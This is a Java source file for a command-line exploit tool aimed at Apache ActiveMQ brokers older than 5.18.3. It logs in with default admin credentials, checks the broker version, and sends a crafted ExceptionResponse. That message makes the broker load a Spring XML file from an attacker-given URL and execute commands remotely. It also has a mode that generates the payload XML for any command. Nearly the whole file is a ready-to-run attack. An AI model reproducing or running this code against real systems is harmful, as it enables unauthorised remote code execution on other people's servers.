package org.example;

import org.apache.activemq.ActiveMQConnection;
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.ActiveMQSession;
import org.apache.activemq.command.*;
import org.apache.activemq.transport.tcp.TcpTransport;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.jms.*;
import javax.jms.Message;
import java.lang.reflect.Field;
import java.net.ConnectException;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.sql.SQLOutput;
import java.util.regex.Pattern;

import static java.lang.Thread.sleep;

public class Main {
    private static final String IP_ADDRESS_REGEX =
            "^([01]?\\d{1,2}|2[0-4]\\d|25[0-5])\\." +
                    "([01]?\\d{1,2}|2[0-4]\\d|25[0-5])\\." +
                    "([01]?\\d{1,2}|2[0-4]\\d|25[0-5])\\." +
                    "([01]?\\d{1,2}|2[0-4]\\d|25[0-5])$";

    public static boolean isValidIPAddress(String ipAddress) {
        Pattern pattern = Pattern.compile(IP_ADDRESS_REGEX);
        return pattern.matcher(ipAddress).matches();
    }
    public static int compareVersions(String version1, String version2) {
        String[] v1 = version1.split("\\.");
        String[] v2 = version2.split("\\.");

        while (v1.length < v2.length) {
            version1 += ".0";
            v1 = version1.split("\\.");
        }
        while (v2.length < v1.length) {
            version2 += ".0";
            v2 = version2.split("\\.");
        }

        for (int i = 0; i < v1.length; i++) {
            int num1 = Integer.parseInt(v1[i]);
            int num2 = Integer.parseInt(v2[i]);

            if (num1 < num2) {
                return -1;
            } else if (num1 > num2) {
                return 1;
            }
        }

        return 0; 
    }
    public static void runExploit(String targetIp, String targetPort, String payloadUrl) {

        try {
            System.out.println("[*] Start attacking target: " + targetIp);
            String activeMQUrl = "tcp://" + targetIp + ":" + targetPort + "?jms.closeTimeout=5000";
            ActiveMQConnectionFactory activeMQConnectionFactory = new ActiveMQConnectionFactory(activeMQUrl);

            activeMQConnectionFactory.setTransportListener(new MyTransportListener());
            Connection connection = activeMQConnectionFactory.createConnection("admin", "admin");
            connection.start();
            ActiveMQSession session = (ActiveMQSession) connection.createSession(false, Session.AUTO_ACKNOWLEDGE);
            String version = connection.getMetaData().getProviderVersion();
            System.out.println("[+] Target version: " + version);
            if (compareVersions(version, "5.18.3") != -1) {
                System.out.println("[-] The target version does not meet the scope of the vulnerability");
                System.exit(0);
            }

            ExceptionResponse exceptionResponse = new ExceptionResponse();
            exceptionResponse.setException((Throwable) new ClassPathXmlApplicationContext(payloadUrl));

            ((ActiveMQConnection) connection).getTransportChannel().oneway(exceptionResponse);

            System.out.println("[+] Success");
            connection.close();
        } catch (Exception e) {
            System.out.println("[-] Error");
            return;
        }

        System.out.println("[+] Exploit completed");

    }

    public static void main(String[] args)
        {
            System.err.close();
            System.setErr(System.out);
            String start = "\n" +
                    "    ___          __   _               __  ___ ____      ______              __        _  __     \n" +
                    "   /   |  _____ / /_ (_)_   __ ___   /  |/  // __ \\    / ____/_  __ ____   / /____   (_)/ /_    \n" +
                    "  / /| | / ___// __// /| | / // _ \\ / /|_/ // / / /   / __/  | |/_// __ \\ / // __ \\ / // __/    \n" +
                    " / ___ |/ /__ / /_ / / | |/ //  __// /  / // /_/ /   / /___ _>  < / /_/ // // /_/ // // /_      \n" +
                    "/_/  |_|\\___/ \\__//_/  |___/ \\___//_/  /_/ \\___\\_\\  /_____//_/|_|/ .___//_/ \\____//_/ \\__/      \n" +
                    "                                                                /_/                             \n";
            System.out.println(start);

        String targetIp = args.length >= 1 ? args[0] : "";
        if (targetIp.equals("exp")){
            String cmd = args.length >= 2 ? args[1] : "";
            System.out.println(Exp.getxml(cmd));

        }else if (args.length == 3){
            String targetPort = args[1];
            String payloadUrl = args[2];

            runExploit(targetIp, targetPort, payloadUrl);
        }else {
            System.out.println("Usage: java -jar activemq-exp.jar <targetIp> <targetPort> <payloadUrl>");
            System.out.println("Get exp xml content: java -jar activemq-exp.jar exp <cmd>");
        }
        System.exit(0);

    }
}